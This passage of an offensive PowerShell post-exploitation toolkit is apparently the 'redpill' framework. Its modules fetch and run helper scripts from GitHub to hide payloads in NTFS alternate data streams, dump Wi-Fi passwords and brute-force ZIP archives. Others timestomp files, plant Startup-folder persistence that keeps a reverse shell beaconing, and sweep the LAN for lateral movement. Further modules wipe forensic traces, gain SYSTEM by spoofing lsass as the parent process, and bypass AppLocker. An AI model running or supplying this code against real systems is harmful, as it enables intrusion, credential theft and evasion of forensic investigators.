   .DESCRIPTION
      Alternate Data Streams (ADS) have been around since the introduction
      of windows NTFS. Basically ADS can be used to hide the presence of a
      secret or malicious file inside the file record of an innocent file.

   .NOTES
      Required Dependencies: Payload.bat|ps1|txt|exe + legit.txt
      This module hiddes {txt|bat|ps1|exe} $DATA inside ADS records.
      Remark: Payload.[extension] + legit.txt must be on the same dir.

   .EXAMPLE
      PS C:\> .\redpill.ps1 -ADS Enum -StreamData "payload.bat" -StartDir "$Env:TMP"
      Search recursive for payload.bat ADS stream record existence starting on -StartDir [ dir ]

   .EXAMPLE
      PS C:\> .\redpill.ps1 -ADS Create -StreamData "Payload.bat" -InTextFile "legit.txt"
      Hidde the data of Payload.bat script inside legit.txt ADS $DATA record

   .EXAMPLE
      PS C:\> .\redpill.ps1 -ADS Exec -StreamData "payload.bat" -InTextFile "legit.mp3"
      Execute\Access the alternate data stream of the sellected -InTextFile [ file ]

   .EXAMPLE
      PS C:\> .\redpill.ps1 -ADS Clear -StreamData "Payload.bat" -InTextFile "legit.txt"
      Delete payload.bat ADS $DATA stream from legit.txt text file records

   .OUTPUTS
      AlternateDataStream
      -------------------
      C:\Users\pedro\AppData\Local\Temp\legit.txt

      [cmd prompt] AccessHiddenData
      -----------------------------
      wmic.exe process call create "C:\Users\pedro\AppData\Local\Temp\legit.txt:payload.exe"
   #>

   ## Download AdsMasquerade.ps1 from my GitHub
   If(-not(Test-Path -Path "$Env:TMP\AdsMasquerade.ps1")){## Download AdsHidde.ps1 from my GitHub repository
      Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/AdsMasquerade.ps1 -Destination $Env:TMP\AdsMasquerade.ps1 -ErrorAction SilentlyContinue|Out-Null
      ## Check downloaded file integrity => FileSizeKBytes
      $SizeDump = ((Get-Item -Path "$Env:TMP\AdsMasquerade.ps1" -EA SilentlyContinue).length/1KB)
      If($SizeDump -lt 19){## Corrupted download detected => DefaultFileSize: 19,646484375/KB
         Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
         If(Test-Path -Path "$Env:TMP\AdsMasquerade.ps1"){Remove-Item -Path "$Env:TMP\AdsMasquerade.ps1" -Force}
         Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
      }   
   }

   ## Run auxiliary module
   If($ADS -ieq "Enum"){
      powershell -File "$Env:TMP\AdsMasquerade.ps1" -ADS Enum -StreamData "$StreamData" -StartDir "$StartDir"
   }ElseIf($ADS -ieq "Create"){
      powershell -File "$Env:TMP\AdsMasquerade.ps1" -ADS Create -StreamData "$StreamData" -InTextFile "$InTextFile"
   }ElseIf($ADS -ieq "Exec"){
      powershell -File "$Env:TMP\AdsMasquerade.ps1" -ADS Exec -StreamData "$StreamData" -InTextFile "$InTextFile"
   }ElseIf($ADS -ieq "Clear"){
      powershell -File "$Env:TMP\AdsMasquerade.ps1" -ADS Clear -StreamData "$StreamData" -InTextFile "$InTextFile"
   }

   ## Clean Old files left behind
   If(Test-Path -Path "$Env:TMP\AdsMasquerade.ps1"){Remove-Item -Path "$Env:TMP\AdsMasquerade.ps1" -Force}
}

If($WifiPasswords -ieq "Dump" -or $WifiPasswords -ieq "ZipDump"){

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Dump All SSID Wifi passwords

   .DESCRIPTION
      Module to dump SSID Wifi passwords into terminal windows
      OR dump credentials into a zip archive under `$Env:TMP

   .NOTES
      Required Dependencies: netsh {native}

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -WifiPasswords Dump
      Dump ALL Wifi Passwords on this terminal prompt

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -WifiPasswords ZipDump
      Dump Wifi Paswords into a Zip archive on %TMP% {default}

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -WifiPasswords ZipDump -Storage `$Env:APPDATA
      Dump Wifi Paswords into a Zip archive on %APPDATA% remote directory

   .OUTPUTS
      SSID name               Password    
      ---------               --------               
      CampingMilfontesWifi    Milfontes19 
      NOS_Internet_Movel_202E 37067757                                             
      Ondarest                381885C874           
      MEO-968328              310E0CBA14
   #>

   ## Download WifiPasswords.ps1 from my GitHub
   If(-not(Test-Path -Path "$Env:TMP\WifiPasswords.ps1")){## Download WifiPasswords.ps1 from my GitHub repository
      Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/WifiPasswords.ps1 -Destination $Env:TMP\WifiPasswords.ps1 -ErrorAction SilentlyContinue|Out-Null
      ## Check downloaded file integrity => FileSizeKBytes
      $SizeDump = ((Get-Item -Path "$Env:TMP\WifiPasswords.ps1" -EA SilentlyContinue).length/1KB)
      If($SizeDump -lt 3){## Corrupted download detected => DefaultFileSize: 3,455078125/KB
         Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
         If(Test-Path -Path "$Env:TMP\WifiPasswords.ps1"){Remove-Item -Path "$Env:TMP\WifiPasswords.ps1" -Force}
         Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
      }   
   }

   ## Run auxiliary module
   If($WifiPasswords -ieq "Dump"){
      powershell -File "$Env:TMP\WifiPasswords.ps1" -WifiPasswords Dump -Storage $Storage
   }ElseIf($WifiPasswords -ieq "ZipDump"){
      powershell -File "$Env:TMP\WifiPasswords.ps1" -WifiPasswords ZipDump -Storage $Storage
   }

   ## Clean Old files left behind
   If(Test-Path -Path "$Env:TMP\WifiPasswords.ps1"){Remove-Item -Path "$Env:TMP\WifiPasswords.ps1" -Force}
}

If($BruteZip -ne "false"){

   <#
   .SYNOPSIS
      Author: @securethelogs|@r00t-3xp10it
      Helper - Brute force ZIP archives {7z.exe}

   .DESCRIPTION
      This module brute forces ZIP archives with the help of 7z.exe
      It also downloads custom password list from @josh-newton GitHub
      Or accepts User dicionary if stored in `$Env:TMP\passwords.txt

   .NOTES
      Required Dependencies: 7z.exe {manual-install}
      Required Dependencies: `$Env:TMP\passwords.txt {auto|manual}
      Remark: Use double quotes if path contains any empty spaces.

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -BruteZip `$Env:USERPROFILE\Desktop\Archive.zip
      Brute forces the zip archive defined by -BruteZip parameter with 7z.exe bin.

   .LINK
      https://github.com/securethelogs/Powershell/tree/master/Redteam
      https://raw.githubusercontent.com/josh-newton/python-zip-cracker/master/passwords.txt
   #>

   ## Local Var declarations
   $Thepasswordis = $null
   $PasFileStatus = $False
   $PassList = "$Env:TMP\passwords.txt"
   $7z = "C:\Program Files\7-Zip\7z.exe"

   If(-not(Test-Path -Path "$BruteZip")){## Make sure Archive exists
      Write-Host "[error] Zip archive not found: $BruteZip!" -ForegroundColor Red -BackgroundColor Black
      Write-Host "";Start-Sleep -Seconds 1;exit ## Exit @redpill
   }Else{## Archive found
      $ZipArchiveName = $BruteZip.Split('\\')[-1] ## Get File Name from Path
      $SizeDump = ((Get-Item -Path "$BruteZip" -EA SilentlyContinue).length/1KB)
      Write-Host "[i] Archive $ZipArchiveName found!"
      Start-Sleep -Seconds 1
   }

   ## Download passwords.txt from my github repository using a fake User-Agent
   If(-not(Test-Path -Path "$PassList")){## Check if password list exists
      $PassFile = $PassList.Split('\\')[-1]
      Write-Host "[+] Downloading $PassFile (iwr)"
      iwr -uri https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Leaked-Databases/rockyou-75.txt -OutFile $PassList -UserAgent "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"
      #Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/utils/passwords.txt -Destination $PassList -ErrorAction SilentlyContinue|Out-Null
   }Else{## User Input dicionary
      $PassFile = $PassList.Split('\\')[-1]
      Write-Host "[i] dicionary $PassFile found!"
      Start-Sleep -Seconds 1
      $PasFileStatus = $True
   }

   If(-not($PasFileStatus -ieq $True)){
      ## Check for file download integrity (fail/corrupted downloads)
      $CheckInt = Get-Content -Path "$PassList" -EA SilentlyContinue
      $SizeDump = ((Get-Item -Path "$PassList" -EA SilentlyContinue).length/1KB) ## default => 467,7109375/KB
      If(-not(Test-Path -Path "$PassList") -or $SizeDump -lt 467 -or $CheckInt -iMatch '^(<!DOCTYPE html)'){
         ## Fail to download password list using BitsTransfer OR the downloaded file is corrupted
         Write-Host "[abort] fail to download password list using BitsTransfer (BITS)" -ForeGroundColor Red -BackGroundColor Black
         If(Test-Path -Path "$PassList"){Remove-Item -Path "$PassList" -Force}
         Write-Host "";Start-Sleep -Seconds 1;exit ## Exit @redpill
      }Else{## Dicionary file found\downloaded
         $tdfdr = $PassList.Split('\\')[-1]
         Write-Host "[i] dicionary $tdfdr Dowloaded!"
         Start-Sleep -Seconds 1
      }
   }
   
   ## Start Brute Force Attack
   $BruteTimer = Get-Date -Format 'HH:mm:ss'
   Write-Host "[+] $BruteTimer - starting brute force module!" -ForeGroundColor Green
   If(Test-Path "$7z" -EA SilentlyContinue){
      $passwords = Get-Content -Path "$PassList" -EA SilentlyContinue

      ForEach($Item in $passwords){
         If($Thepasswordis -eq $null){
            $brute = &"C:\Program Files\7-Zip\7z.exe" e "$BruteZip" -p"$Item" -y

            If($brute -contains "Everything is Ok"){
               $Thepasswordis = $Item
               Clear-Host;Start-Sleep -Seconds 1
               Write-Host "`n`n$BruteTimer - Brute force Zip archives" -ForegroundColor Green
               Write-Host "------------------------------------"
               Write-Host "Zip Archive  : $ZipArchiveName" -ForegroundColor Green
               Write-Host "Archive Size : $SizeDump/KB" -ForegroundColor Green
               Write-Host "Password     : $Thepasswordis" -ForegroundColor Green
               Write-Host "------------------------------------"
            } ## Brute IF
         } ## Check passwordis
      } ## Foreach Rule

   }Else{## 7Zip Isn't Installed
      Write-Host "[error] 7Zip Mandatory Appl doesn't appear to be installed!" -ForegroundColor Red -BackgroundColor Black
   }
   ## Clean Old files left behind
   If(Test-Path -Path "$PassList"){Remove-Item -Path "$PassList" -Force}
   Write-Host "";Start-Sleep -Seconds 1
}

If($FileMace -ne "false"){

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Change file mace time {timestamp}

   .DESCRIPTION
      This module changes the follow mace propertys:
      CreationTime, LastAccessTime, LastWriteTime

   .NOTES
      -Date parameter format: "08 March 1999 19:19:19"
      Remark: Double quotes are mandatory in -Date parameter

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -FileMace $Env:TMP\test.txt
      Changes sellected file mace using redpill default -Date "date-format"

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -FileMace $Env:TMP\test.txt -Date "08 March 1999 19:19:19"
      Changes sellected file mace using user inputed -Date "date-format"

   .OUTPUTS
      FullName                        Exists CreationTime       
      --------                        ------ ------------       
      C:\Users\pedro\Desktop\test.txt   True 08/03/1999 19:19:19
   #>

   ## Download FileMace.ps1 from my GitHub
   If(-not(Test-Path -Path "$Env:TMP\FileMace.ps1")){## Download FileMace.ps1 from my GitHub repository
      Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/FileMace.ps1 -Destination $Env:TMP\FileMace.ps1 -ErrorAction SilentlyContinue|Out-Null
      ## Check downloaded file integrity => FileSizeKBytes
      $SizeDump = ((Get-Item -Path "$Env:TMP\FileMace.ps1" -EA SilentlyContinue).length/1KB)
      If($SizeDump -lt 2){## Corrupted download detected => DefaultFileSize: 2,2607421875/KB
         Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
         If(Test-Path -Path "$Env:TMP\FileMace.ps1"){Remove-Item -Path "$Env:TMP\FileMace.ps1" -Force}
         Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
      }   
   }

   ## run the auxiliary mdule
   powershell -File "$Env:TMP\FileMace.ps1" -FileMace "$FileMace" -Date "$Date"

   ## Clean Old files left behind
   If(Test-Path -Path "$Env:TMP\FileMace.ps1"){Remove-Item -Path "$Env:TMP\FileMace.ps1" -Force}
}

If($MetaData -ne "false"){

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Display file \ application description (metadata)
   
   .DESCRIPTION
      Display file \ application description (metadata)

   .NOTES
      -Extension [ exe ] parameter its used to recursive search starting in -MetaData
      directory for standalone executables (exe) and display is property descriptions.

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -MetaData "$Env:USERPROFILE\Desktop\CommandCam.exe"
      Display CommandCam.exe standalone executable file description (metadata)

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -MetaData "$Env:USERPROFILE\Desktop" -Extension "exe"
      Search for [ exe ] recursive starting in -MetaData [ dir ] and display descriptions

   .OUTPUTS
      FileMetadata
      ------------
      Name           : CommandCam.exe
      CreationTime   : 23/02/2021 18:31:55
      LastAccessTime : 23/02/2021 18:31:55
      VersionInfo    : File:             C:\Users\pedro\Desktop\CommandCam.exe
                       InternalName:     CommandCam.exe
                       OriginalFilename: CommandCam.exe
                       FileVersion:      0.0.2.8
                       FileDescription:  meterpeter WebCamSnap
                       Product:          meterpeter WebCamSnap
                       ProductVersion:   1.0.2.8
                       Debug:            False
                       Patched:          False
                       PreRelease:       False
                       PrivateBuild:     True
                       SpecialBuild:     False
                       Language:         Idioma neutro
   #>

   ## Download MetaData.ps1 from my GitHub
   If(-not(Test-Path -Path "$Env:TMP\MetaData.ps1")){## Download MetaData.ps1 from my GitHub repository
      Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/MetaData.ps1 -Destination $Env:TMP\MetaData.ps1 -ErrorAction SilentlyContinue|Out-Null
      ## Check downloaded file integrity => FileSizeKBytes
      $SizeDump = ((Get-Item -Path "$Env:TMP\MetaData.ps1" -EA SilentlyContinue).length/1KB)
      If($SizeDump -lt 4){## Corrupted download detected => DefaultFileSize: 4,8173828125/KB
         Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
         If(Test-Path -Path "$Env:TMP\MetaData.ps1"){Remove-Item -Path "$Env:TMP\MetaData.ps1" -Force}
         Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
      }   
   }

   ## run the auxiliary mdule
   If(-not($Extension -ne "false")){
       powershell -File "$Env:TMP\MetaData.ps1" -MetaData "$MetaData"
   }Else{
       powershell -File "$Env:TMP\MetaData.ps1" -MetaData "$MetaData"  -Extension "$Extension"  
   }

   ## Clean Old files left behind
   If(Test-Path -Path "$Env:TMP\MetaData.ps1"){Remove-Item -Path "$Env:TMP\MetaData.ps1" -Force}
}

If($NetTrace -ieq "Enum"){

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Agressive sytem enumeration with netsh

   .NOTES
      Required Dependencies: netsh {native}
      Remark: Administrator privilges required on shell
      Remark: Dump will be saved under %TMP%\NetTrace.cab {default}
      
   .EXAMPLE
      PS C:> powershell -File redpill.ps1 -NetTrace Enum

   .EXAMPLE
      PS C:> powershell -File redpill.ps1 -NetTrace Enum -Storage %TMP%

   .OUTPUTS
      Trace configuration:
      -------------------------------------------------------------------
      Status:             Running
      Trace File:         C:\Users\pedro\AppData\Local\Temp\NetTrace.etl
      Append:             Off
      Circular:           On
      Max Size:           4096 MB
      Report:             Off
   #>

   ## Download NetTrace.ps1 from my GitHub
   If(-not(Test-Path -Path "$Env:TMP\NetTrace.ps1")){## Download NetTrace.ps1 from my GitHub repository
      Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/NetTrace.ps1 -Destination $Env:TMP\NetTrace.ps1 -ErrorAction SilentlyContinue|Out-Null
      ## Check downloaded file integrity => FileSizeKBytes
      $SizeDump = ((Get-Item -Path "$Env:TMP\NetTrace.ps1" -EA SilentlyContinue).length/1KB)
      If($SizeDump -lt 2){## Corrupted download detected => DefaultFileSize: 2,5419921875/KB
         Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
         If(Test-Path -Path "$Env:TMP\NetTrace.ps1"){Remove-Item -Path "$Env:TMP\NetTrace.ps1" -Force}
         Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
      }   
   }

   ## run the auxiliary mdule
   powershell -File "$Env:TMP\NetTrace.ps1" -NetTrace Enum -Storage $Storage

   ## Clean Old files left behind
   If(Test-Path -Path "$Env:TMP\NetTrace.ps1"){Remove-Item -Path "$Env:TMP\NetTrace.ps1" -Force}
}

If($Persiste -ne "false" -and $GetTasks -ieq "false"){

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Persiste scripts using StartUp folder

   .DESCRIPTION
      This persistence module beacons home in sellected intervals defined
      by CmdLet User with the help of -BeaconTime parameter. The objective
      its to execute our script on every startup from 'xx' to 'xx' seconds.

   .NOTES
      Remark: Use double quotes if Path has any empty spaces in name.
      Remark: '-GetProcess Enum -ProcessName Wscript.exe' can be used
      to manual check the status of wscript process (BeaconHome function)
      Remark: Payload supported extensions: ps1|exe|py|vbs|bat

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -Persiste Stop
      Stops wscript process (vbs) and delete persistence.vbs script
      Remark: This function stops the persiste.vbs from beacon home
      and deletes persiste.vbs Leaving our reverse tcp shell intact.

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -Persiste `$Env:TMP\Payload.ps1
      Execute Payload.ps1 at every StartUp with 10 sec of interval between each execution

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -Persiste `$Env:TMP\Payload.ps1 -BeaconTime 28
      Execute Payload.ps1 at every StartUp with 28 sec of interval between each execution

   .OUTPUTS
      Sherlock.ps1 Persistence Settings
      ---------------------------------
      BeaconHomeInterval : 10 (sec) interval
      ClientAbsoluctPath : Sherlock.ps1
      PersistenceScript  : C:\Users\pedro\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Persiste.vbs
      PersistenceScript  : Successfuly Created!
      wscriptProcStatus  : Stopped! {require SKYNET restart}
      OR the manual execution of Persiste.vbs script! {StartUp}
   #>

   ## Download Persiste.ps1 from my GitHub
   If(-not(Test-Path -Path "$Env:TMP\Persiste.ps1")){## Download Persiste.ps1 from my GitHub repository
      Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/Persiste.ps1 -Destination $Env:TMP\Persiste.ps1 -ErrorAction SilentlyContinue|Out-Null
      ## Check downloaded file integrity => FileSizeKBytes
      $SizeDump = ((Get-Item -Path "$Env:TMP\Persiste.ps1" -EA SilentlyContinue).length/1KB)
      If($SizeDump -lt 7){## Corrupted download detected => DefaultFileSize: 7,1796875/KB
         Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
         If(Test-Path -Path "$Env:TMP\Persiste.ps1"){Remove-Item -Path "$Env:TMP\Persiste.ps1" -Force}
         Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
      }   
   }

   ## Run auxiliary module
   If($Persiste -ne "false" -and $Persiste -ne "Stop"){
       powershell -File "$Env:TMP\Persiste.ps1" -Persiste $Persiste -BeaconTime $BeaconTime
   }ElseIf($Persiste -ieq "Stop"){
       powershell -File "$Env:TMP\Persiste.ps1" -Persiste Stop
   }

   ## Clean Old files left behind
   If(Test-Path -Path "$Env:TMP\Persiste.ps1"){Remove-Item -Path "$Env:TMP\Persiste.ps1" -Force}
}

If($PingSweep -ieq "Enum" -or $PingSweep -ieq "Verbose"){

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Enumerate active IP Address {Local Lan}

   .DESCRIPTION
      Module to enumerate active IP address of Local Lan
      for possible Lateral Movement oportunitys. It reports
      active Ip address in local lan and scans for open ports
      in all active ip address found by -PingSweep Enum @arg.

   .NOTES
      Required Dependencies: .Net.Networkinformation.ping {native}
      Remark: Ping Sweep module migth take a long time to finish
      depending of -Range parameter user input sellection or if
      the Verbose @Argument its used to scan for open ports.

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -PingSweep Enum
      Enumerate All active IP Address on Local Lan {range 1..255}

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -PingSweep Enum -Range "65,72"
      Enumerate All active IP Address on Local Lan within the Range selected

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -PingSweep Verbose -Range "65,72"
      Scans for IP address and open ports (top-ports) in all IP's found in Local Lan

   .OUTPUTS
      Range[65..72] Active IP Address on Local Lan
      --------------------------------------------
      Address       : 192.168.1.65
      Address       : 192.168.1.66
      Address       : 192.168.1.70
      Address       : 192.168.1.72
   #>

   ## Download PingSweep.ps1 from my GitHub
   If(-not(Test-Path -Path "$Env:TMP\PingSweep.ps1")){## Download PingSweep.ps1 from my GitHub repository
      Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/PingSweep.ps1 -Destination $Env:TMP\PingSweep.ps1 -ErrorAction SilentlyContinue|Out-Null
      ## Check downloaded file integrity => FileSizeKBytes
      $SizeDump = ((Get-Item -Path "$Env:TMP\PingSweep.ps1" -EA SilentlyContinue).length/1KB)
      If($SizeDump -lt 8){## Corrupted download detected => DefaultFileSize: 8,2177734375/KB
         Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
         If(Test-Path -Path "$Env:TMP\PingSweep.ps1"){Remove-Item -Path "$Env:TMP\PingSweep.ps1" -Force}
         Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
      }   
   }

   ## Run auxiliary module
   If($PingSweep -ieq "Enum"){## Loop function {Sellected Range}
       powershell -File "$Env:TMP\PingSweep.ps1" -PingSweep Enum -Range $Range
   }ElseIf($PingSweep -ieq "Verbose"){
       powershell -File "$Env:TMP\PingSweep.ps1" -PingSweep Verbose -Range $Range
   }

   ## Clean Old files left behind
   If(Test-Path -Path "$Env:TMP\iprange.log"){Remove-Item -Path "$Env:TMP\iprange.log" -Force}
   If(Test-Path -Path "$Env:TMP\PingSweep.ps1"){Remove-Item -Path "$Env:TMP\PingSweep.ps1" -Force}
}

If($CleanTracks -ieq "Clear" -or $CleanTracks -ieq "Paranoid"){

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Clean Temp\Logs\Script artifacts

   .DESCRIPTION
      Module to clean artifacts that migth lead
      forensic investigatores to attacker steps.
      It deletes lnk, db, log, tmp files, recent
      folder, Prefetch, and registry locations.

   .NOTES
      Required Dependencies: cmd|regedit {native}

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -CleanTracks Clear
      Clean Temp\Logs\Script artifacts left behind

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -CleanTracks Paranoid
      Remark: Paranoid @arg deletes @redpill aux scripts

   .OUTPUTS
      Function    Date     DataBaseEntrys ModifiedRegKeys ScriptsCleaned
      --------    ----     -------------- --------------- --------------
      CleanTracks 22:17:29 20             3               2
   #>

   ## Download CleanTracks.ps1 from my GitHub
   If(-not(Test-Path -Path "$Env:TMP\CleanTracks.ps1")){## Download CleanTracks.ps1 from my GitHub repository
      Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/CleanTracks.ps1 -Destination $Env:TMP\CleanTracks.ps1 -ErrorAction SilentlyContinue|Out-Null
      ## Check downloaded file integrity => FileSizeKBytes
      $SizeDump = ((Get-Item -Path "$Env:TMP\CleanTracks.ps1" -EA SilentlyContinue).length/1KB)
      If($SizeDump -lt 8){## Corrupted download detected => DefaultFileSize: 8,6474609375/KB
         Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
         If(Test-Path -Path "$Env:TMP\CleanTracks.ps1"){Remove-Item -Path "$Env:TMP\CleanTracks.ps1" -Force}
         Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
      }   
   }

   ## Run auxiliary module
   If($CleanTracks -ieq "Clear"){## Loop function {Sellected Range}
       powershell -File "$Env:TMP\CleanTracks.ps1" -CleanTracks Clear
   }ElseIf($CleanTracks -ieq "Paranoid"){
       powershell -File "$Env:TMP\CleanTracks.ps1" -CleanTracks Paranoid
   }

   ## Clean Old files left behind
   If(Test-Path -Path "$Env:TMP\CleanTracks.ps1"){Remove-Item -Path "$Env:TMP\CleanTracks.ps1" -Force}
}

If($psgetsys -ne "false")
{

   <#
   .SYNOPSIS
      Powershell/C# to spawn a process under a different parent process!

   .DESCRIPTION
      Normally when a process launches a child process, it becomes the parent of the child process.
      If we create a new process setting also the parent process property, the child process will inherit
      the token of the specified parent process and impersonate this one. So if we create a new process,
      setting the parent PID the process owned by SYSTEM, we get a SYSTEM priv escalation technic! (EOP)

   .NOTES
      We need to have elevated rights in order to create a process from the parent process handle,
      typically seDebugPrivilege which administrators have (note: if a regular user has this privilege
      too, he has the keys for the kingdom!). Keep in mind that this privilege is available only from
      an elevated command prompt.
   
   .Parameter Filter
      Display process names by filtering token privs (default: false)
   
   .Parameter Parent
      The parent process name to inherit tokens from (default: lsass)

   .Parameter Child
      The child process to spawnm, absoluct path (default: $Env:WINDIR\system32\cmd.exe)

   .Parameter CmdLine
      The cmdline to execute through the child process (default: false)

   .Parameter LogFile
      The logfile to create absoluct\relative path (default: false)
   
   .Parameter Clean
      Delete eventvwr Powershell/Operational logs? (default: false)
   
   .EXAMPLE
      PS C:\> .\redpill.ps1 -psgetsys Enum -Filter "NT AUTHORITY\SYSTEM"
      Query for processes with '<SYSTEM>' privileges attached.

   .EXAMPLE
      PS C:\> .\redpill.ps1 -psgetsys enum -Filter "NT AUTHORITY\SYSTEM" -LogFile "psgetsys.log"
      Query for processes with '<SYSTEM>' privs attached and store data in logfile.
   
   .EXAMPLE
      PS C:\> .\redpill.ps1 -psgetsys impersonate -Parent "random" -Child "$PSHOME\Powershell.exe"
      Let cmdlet auto-sellect the first '<SYSTEM>' process.Id to use as Parent.   

   .EXAMPLE
      PS C:\> .\redpill.ps1 -psgetsys impersonate -Parent "explorer" -Child "$Env:WINDIR\system32\cmd.exe"
      Spawn child process (cmd) with privs inherit from parent process (SKYNET\pedro)

   .EXAMPLE
      PS C:\> .\redpill.ps1 -psgetsys impersonate -Parent "lsass" -Child "$PSHOME\Powershell.exe"
      Spawn child process (PS) with privs inherit from parent process (NT AUTHORITY\SYSTEM)

   .EXAMPLE
      PS C:\> .\redpill.ps1 -psgetsys impersonate -Parent "lsass" -Child "$Env:WINDIR\system32\cmd.exe" -CmdLine "cmd /c whoami > zzz.txt"
      Spawn child process (cmd) with privs inherit from parent process (lsass::SYSTEM) that silent executes -CmdLine  
   
   .OUTPUTS
      * Checking module dependencies ..

      [+] Got Handle for ppid: 968 (lsass)
      [+] Updated process attribute list ..
      [+] Starting C:\WINDOWS\system32\cmd.exe...True - pid: 12564
   
      Responding Name    Id Description               UserName
      ---------- ----    -- -----------               --------
            True cmd  12564 Windows Command Processor NT AUTHORITY\SYSTEM

   .LINK
      https://github.com/r00t-3xp10it/redpill
      https://github.com/decoder-it/psgetsystem
   #>


   ## Download psgetsys.ps1 from my GitHub
   If(-not(Test-Path -Path "$Env:TMP\psgetsys.ps1"))
   {
      iwr -Uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/psgetsys.ps1" -OutFile "$Env:TMP\psgetsys.ps1" -UserAgent "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"|Out-Null
   }

   #Trigger cmdlet execution
   If($psgetsys -ieq "Enum")
   {
      If($Filter -ieq "false"){$Filter = "SYSTEM"}
      #Enumerate processes privileges available {tokens}
      powershell -File "$Env:TMP\psgetsys.ps1" -Filter "$Filter"
   }
   ElseIf($psgetsys -ieq "auto")
   {
      If($Chid -ieq "false"){$Chid = "$PSHOME\Powershell.exe"}
      #Use cmdlet default settings to spawn a console with SYSTEM privs impersonated from parent! { POC }
      powershell -File "$Env:TMP\psgetsys.ps1" -Parent "random" -Child "$Child" -CmdLine "false" -Clean "True"
   }
   ElseIf($psgetsys -ieq "impersonate")
   {
      #User configurations - manual process token impersonation!
      powershell -File "$Env:TMP\psgetsys.ps1" -Parent "$Parent" -Child "$Child" -CmdLine "$CmdLine" -LogFile "$LogFile" -Clean "$Clean"
   }

   ## Clean Old files left behind
   If(Test-Path -Path "$Env:TMP\psgetsys.ps1"){Remove-Item -Path "$Env:TMP\psgetsys.ps1" -Force}
}

if($AppLocker -ne "false"){

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Enumerate directorys with weak permissions (bypass applocker)

   .Parameter Verb
      Accepts arguments: True, False (verbose enumeration)

   .Parameter AppLocker
      Accepts arguments: Enum, WhoAmi and TestBat

   .Parameter FolderRigths
      Accepts permissions: Modify, Write, FullControll, ReadAndExecute

   .Parameter GroupName
      Accepts GroupNames: Everyone, BUILTIN\Users, NT AUTHORITY\INTERACTIVE

   .EXAMPLE
      PS C:\> Powershell -File redpill.ps1 -AppLocker WhoAmi
      Enumerate ALL Group Names available on local machine

   .EXAMPLE
      PS C:\> Powershell -File redpill.ps1 -AppLocker TestBat
      Test for AppLocker Batch Script Execution Restriction bypass

   .EXAMPLE
      PS C:\> Powershell -File redpill.ps1 -AppLocker "$Env:TMP\applock.bat"
      Execute applock.bat through text format bypass tecnic

   .EXAMPLE
      PS C:\> Powershell -File redpill.ps1 -AppLocker Enum -GroupName "BUILTIN\Users" -FolderRigths "Write"
      Enumerate directorys owned by 'BUILTIN\Users' GroupName with 'Write' permissions

   .EXAMPLE
      PS C:\> Powershell -File redpill.ps1 -AppLocker Enum -GroupName "Everyone" -FolderRigths "FullControl"
      Enumerate directorys owned by 'Everyone' GroupName with 'FullControl' permissions

   .OUTPUTS
      AppLocker - Weak Directory permissions
      --------------------------------------
      VulnId            : 1::ACL (Mitre T1222)
